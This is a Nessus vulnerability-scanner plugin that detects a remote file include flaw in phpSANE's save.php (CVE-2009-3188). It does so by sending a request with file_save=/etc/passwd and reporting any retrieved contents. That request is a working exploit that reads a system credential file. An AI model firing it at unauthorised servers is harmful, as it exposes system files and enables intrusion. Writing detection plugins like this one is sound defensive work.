#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if (description)
{
  script_id(40796);
  script_version("$Revision: 1.3 $");

  script_cve_id("CVE-2009-3188");
  script_xref(name:"milw0rm", value:"9533");
  script_xref(name:"OSVDB", value:"57434");
  script_xref(name:"Secunia", value:"36476");

  script_name(english:"phpSANE file_save Parameter Remote File Include");
  script_summary(english:"Tries to read a local file");

  script_set_attribute(
    attribute:"synopsis",
    value:string(
      "The remote web server contains a PHP script that is affected by a\n",
      "remote file include vulnerability."
    )
  );
  script_set_attribute(
    attribute:"description", 
    value:string(
      "The remote web server is running phpSANE, an open source web-based\n",
      "frontend to scanners using SANE (Scanner Access Now Easy). \n",
      "\n",
      "The version of phpSANE installed on the remote host fails to sanitize\n",
      "user-supplied input to the 'file_save' parameter of the 'save.php'\n",
      "script before using it to include PHP code. Regardless of PHP's\n",
      "'register_globals' setting, an unauthenticated attacker can exploit\n",
      "this issue to view arbitrary files or possibly to execute arbitrary\n",
      "PHP code, possibly taken from third-party hosts."
    )
  );
  script_set_attribute(
    attribute:"solution", 
    value:string(
      "Unknown at this time."
    )
  );
  script_set_attribute(
    attribute:"cvss_vector", 
    value:"CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P"
  );
  script_set_attribute(
    attribute:"vuln_publication_date", 
    value:"2009/08/26"
  );
  script_set_attribute(
    attribute:"plugin_publication_date", 
    value:"2009/08/28"
  );
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2009 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0, "Web server does not support PHP scripts.");


file = '/etc/passwd';
file_pat = "root:.*:0:[01]:";


# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/phpsane", "/sane", "/scan", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  # Try to exploit the issue.
  url = string(
    dir, "/save.php?",
    "file_save=", file
  );

  res = http_send_recv3(method:"GET", item:url, port:port);
  if (isnull(res)) exit(1, "The web server failed to respond.");

  # There's a problem if...
  body = res[2];
  if (
    # it looks like phpSANE and...
    '<title>Save</title>' >< body &&
    '<p class="my_pre">' >< body &&
    (
      # we see the expected contents or...
      egrep(pattern:file_pat, string:body) ||
      # we get an error about open_basedir restriction.
      string(file, ") [function.include]: failed to open stream: Operation not permitted") >< body ||
      string(file, ") [<a href='function.include'>function.include</a>]: failed to open stream: Operation not permitted") >< body ||
      string("open_basedir restriction in effect. File(", file) >< body
    )
  )
  {
    if (report_verbosity > 0)
    {
      if (egrep(pattern:file_pat, string:body))
      {
        report = string(
          "\n",
          "Nessus was able to exploit the issue to retrieve the contents of\n",
          "'", file, "' on the remote host using the following URL :\n",
          "\n",
          "  ", build_url(port:port, qs:url), "\n"
        );
        if (report_verbosity > 1)
        {
          contents = "";
          foreach line (split(body, keep:FALSE))
          {
            if ('</p>' == line) break;
            if (in_contents) contents += line + '\n';
            if (!in_contents && '<p class="my_pre">' == line) in_contents = TRUE;
          }
          if (!egrep(pattern:file_pat, string:contents)) contents = body;

          report += string(
            "\n",
            "Here are its contents :\n",
            "\n",
            crap(data:"-", length:30), " snip ", crap(data:"-", length:30), "\n",
            contents,
            crap(data:"-", length:30), " snip ", crap(data:"-", length:30), "\n"
          );
        }
      }
      else
      {
        report = string(
          "\n",
          "Nessus was able to verify the issue exists using the following\n",
          "URL :\n",
          "\n",
          "  ", build_url(port:port, qs:url), "\n"
        );
      }
      security_hole(port:port, extra:report);
    }
    else security_hole(port);
    exit(0);
  }
}
exit(1, "No vulnerable instances of the software were detected.");
